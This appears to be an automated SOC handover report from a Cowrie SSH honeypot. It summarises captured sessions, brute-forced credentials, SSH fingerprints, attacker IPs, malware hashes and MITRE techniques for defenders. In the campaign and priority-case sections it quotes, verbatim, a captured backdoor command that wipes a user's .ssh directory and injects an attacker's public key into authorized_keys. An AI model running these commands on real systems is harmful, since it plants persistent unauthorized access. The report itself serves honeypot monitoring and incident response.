# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-01 |
| **Generated At** | 2026-04-01T07:03:34Z |
| **Shift Time** | 07:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **13** |
| Confirmed Threats | **9** |
| False Positives Filtered | **4** (30.8%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **8** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **10** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **9** |
| Unique Credential Pairs | **9** |
| Unique Usernames | **6** |
| Unique Passwords | **9** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `ubuntu` | 2 |
| `user` | 1 |
| `345gs5662d34` | 1 |
| `pi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 1 |
| `user888` | 1 |
| `40404040` | 1 |
| `345gs5662d34` | 1 |
| `3245gs5662d34` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `ubuntu` | `123456` | 1 |
| `user` | `user888` | 1 |
| `root` | `40404040` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `root` | `3245gs5662d34` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `40404040` | `9.223.176.221` | 2026-04-01T06:34:50 |
| `root` | `3245gs5662d34` | `9.223.176.221` | 2026-04-01T06:34:54 |
| `root` | `1234` | `223.228.137.145` | 2026-04-01T06:59:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **13** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 6 |
| libssh | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 5 | 5 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `eeca2460550b...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 5 | 5 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `eeca2460550b...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `9.223.176.221`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **10** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS852` | TELUS Communications Inc. | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS59497` | Buknet LLC | 1 | HIGH |
| `AS5089` | Virgin Media Limited | 1 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 1 | HIGH |
| `AS45609` | Bharti Airtel Ltd. AS for GPRS Service | 1 | LOW |
| `AS46562` | Performive LLC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be15b578184f

| Field | Detail |
|---|---|
| **Source IP** | `9.223.176[.]221` |
| **First Seen** | 2026-04-01 06:34 |
| **Last Seen** | 2026-04-01 06:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 06:34:49` | `?` |
| `2026-04-01 06:34:49` | `?` |
| `2026-04-01 06:34:49` | `?` |
| `2026-04-01 06:34:50` | `?` |
| `2026-04-01 06:34:50` | `?` |
| `2026-04-01 06:34:50` | `?` |
| `2026-04-01 06:34:50` | `?` |
| `2026-04-01 06:34:50` | `?` |
| `2026-04-01 06:34:51` | `?` |
| `2026-04-01 06:34:51` | `?` |
| `2026-04-01 06:34:51` | `?` |
| `2026-04-01 06:34:51` | `?` |
| `2026-04-01 06:34:54` | `?` |

**Recommended Actions:**
- [ ] Submit `9.223.176[.]221` to AbuseIPDB if not already reported
- [ ] Block `9.223.176[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd29175bdb4

| Field | Detail |
|---|---|
| **Source IP** | `9.223.176[.]221` |
| **First Seen** | 2026-04-01 06:34 |
| **Last Seen** | 2026-04-01 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 06:34:53` | `?` |
| `2026-04-01 06:34:53` | `?` |
| `2026-04-01 06:34:53` | `?` |
| `2026-04-01 06:34:54` | `?` |
| `2026-04-01 06:34:54` | `?` |

**Recommended Actions:**
- [ ] Submit `9.223.176[.]221` to AbuseIPDB if not already reported
- [ ] Block `9.223.176[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `121.179.93[.]147` | 1 | 2026-04-01 06:54 | 2026-04-01 06:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.20.228[.]146` | 1 | 2026-04-01 06:49 | 2026-04-01 06:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.191.237[.]35` | 1 | 2026-04-01 06:58 | 2026-04-01 06:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.149[.]239` | 1 | 2026-04-01 06:29 | 2026-04-01 06:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.157.194[.]2` | 1 | 2026-04-01 06:30 | 2026-04-01 06:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.25.155[.]58` | 1 | 2026-04-01 07:00 | 2026-04-01 07:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `9.223.176[.]221` | 1 | 2026-04-01 06:34 | 2026-04-01 06:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `75.157.194[.]2` | CA | TELUS-FIBRE-SRRYBC02 | **100** ⚠️ | 7 |
| `65.20.149[.]239` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 33 |
| `188.191.237[.]35` | UA | PE Voloschenko Olexandr Volodumirovich | **100** ⚠️ | 14 |
| `86.25.155[.]58` | GB | SEVEN KINGS | **100** ⚠️ | 10 |
| `125.20.228[.]146` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 44 |
| `121.179.93[.]147` | KR | Jeonnambonbujang | **100** ⚠️ | 0 |
| `9.223.176[.]221` | SE | Microsoft Limited | **100** ⚠️ | 0 |
| `98.178.72[.]4` | US | Cox Communications | **61** | 0 |
| `142.54.226[.]210` | US | ZeroLag Communications | **55** | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 9 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 13 cases |
| Tool 34  | Credential Extractor        | ✅ 9 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (30.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 7 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-01T07:03:34Z_
